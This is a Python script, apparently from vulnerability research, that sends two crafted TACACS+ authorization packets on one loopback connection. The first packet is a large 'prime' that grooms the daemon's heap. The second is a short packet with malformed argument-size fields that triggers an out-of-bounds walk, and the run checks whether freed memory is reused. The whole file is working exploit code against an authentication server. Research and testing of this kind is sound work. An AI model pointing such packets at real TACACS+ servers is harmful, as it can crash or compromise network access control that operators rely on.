#!/usr/bin/env python3
"""Send two crafted AUTHOR packets on ONE loopback TACACS+ connection.

Prime (large cmd= marker fill) on seq 1, trigger (short OOB walk) on seq 2,
same session id. Tests whether the trigger's ctx->in buffer reuses the freed
prime chunk inside one daemon context. Nothing off loopback.
"""
import argparse
import socket
import sys

sys.path.insert(0, ".")
from wire import build_author, obfuscate  # noqa: E402
import struct  # noqa: E402


def pkt(arg0, rest, data, sid, key, seq, ptype=2):
    body_data = data.encode()
    argcnt = 1 + len(rest)
    fixed = bytes([6, 1, 1, 1, 0, 0, 0, argcnt])
    sizetable = bytes([arg0]) + bytes(rest)
    body = fixed + sizetable + body_data
    datalength = len(body)
    hdr = struct.pack("!BBBBI", 0xC0, ptype, seq, 0, int.from_bytes(sid, "big"))
    hdr += struct.pack("!I", datalength)
    return hdr + obfuscate(body, sid, key, 0xC0, seq)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=4974)
    ap.add_argument("--key", default="demo")
    ap.add_argument("--sid", default="11223344")
    ap.add_argument("--prime-data", required=True)
    ap.add_argument("--prime-arg0", type=int, default=8)
    ap.add_argument("--prime-rest", type=int, default=254)
    ap.add_argument("--prime-rest-byte", type=int, default=8)
    ap.add_argument("--data", default="cmd=AAAAcmd=BBBBcmd=CCCCcmd=DDDDcmd=EEEEcmd=FFFFcmd=GGGGcmd=HHHH")
    ap.add_argument("--arg0", type=int, default=8)
    ap.add_argument("--rest", type=int, default=19)
    ap.add_argument("--rest-byte", type=int, default=8)
    ap.add_argument("--timeout", type=float, default=2.0)
    args = ap.parse_args()
    sid = bytes.fromhex(args.sid)
    key = args.key.encode()

    s = socket.create_connection(("127.0.0.1", args.port), timeout=args.timeout)
    s.settimeout(args.timeout)
    p1 = pkt(args.prime_arg0, [args.prime_rest_byte] * args.prime_rest,
             args.prime_data, sid, key, 1)
    s.sendall(p1)
    try:
        r1 = s.recv(65536)
    except socket.timeout:
        r1 = b""
    print(f"prime sent={len(p1)} reply_len={len(r1)} reply={r1[:32].hex()}")
    p2 = pkt(args.arg0, [args.rest_byte] * args.rest, args.data, sid, key, 2)
    s.sendall(p2)
    try:
        r2 = s.recv(65536)
    except socket.timeout:
        r2 = b""
    print(f"trigger sent={len(p2)} reply_len={len(r2)} reply={r2[:32].hex()}")
    s.close()


if __name__ == "__main__":
    main()
